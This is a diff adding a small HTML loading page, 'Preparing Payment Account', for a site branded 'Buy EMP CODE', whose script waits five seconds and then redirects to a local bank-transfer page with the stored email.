@@ -1,0 +1,53 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Preparing Payment Account</title>
+  <style>
+    *{box-sizing:border-box} html,body{height:100%}
+    body{margin:0;background:#fff;color:#101315;font-family:"Noto Sans",system-ui,-apple-system,Segoe UI,Roboto,sans-serif}
+    .wrap{min-height:100vh;display:flex;flex-direction:column}
+    .topbar{height:56px;display:flex;align-items:center;justify-content:center;position:relative;background:#FF7A00;color:#D32F2F}
+    .back{position:absolute;left:10px;top:50%;transform:translateY(-50%);background:transparent;border:0;padding:8px}
+    .title{margin:0;font-size:18px;font-weight:800}
+    .content{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:24px;text-align:center}
+    .loader{width:84px;height:84px;border:6px solid rgba(255,122,0,0.25);border-top-color:#FF7A00;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:16px}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    h1{font-size:20px;font-weight:800;margin:8px 0 6px;color:#1C1C4D}
+    p{margin:0;color:#6b7789;font-size:14px}
+    .foot{padding:14px;text-align:center;color:#D32F2F;font-weight:800}
+    .chat{position:fixed;right:16px;bottom:20px;background:#FF7A00;width:52px;height:52px;border-radius:50%;display:grid;place-items:center;box-shadow:0 10px 24px rgba(255,122,0,0.35)}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <header class="topbar">
+      <button class="back" onclick="history.back()" aria-label="Go back">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
+      </button>
+      <h1 class="title">Buy EMP CODE</h1>
+    </header>
+
+    <main class="content" aria-label="Preparing Payment Account">
+      <div class="loader" aria-hidden="true"></div>
+      <h1>Preparing Payment Account</h1>
+      <p>Please wait while we set up your payment…</p>
+    </main>
+
+    <div class="foot">ESAY MOBILE PAY LTD</div>
+
+    <button class="chat" aria-label="Chat">
+      <svg width="26" height="26" viewBox="0 0 24 24" fill="#fff" xmlns="http://www.w3.org/2000/svg"><path d="M21 15a4 4 0 01-4 4H7l-4 3V6a4 4 0 014-4h10a4 4 0 014 4v9z" fill-opacity=".2"/><path d="M7 8h10M7 12h7" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg>
+    </button>
+  </div>
+  <script>
+    // After 5s, go to bank transfer instruction page with email
+    const email = localStorage.getItem('emp_email') || '';
+    setTimeout(() => {
+      const q = new URLSearchParams({ email }).toString();
+      window.location.href = 'bank-transfer.html?' + q;
+    }, 5000);
+  </script>
+</body>
+</html>
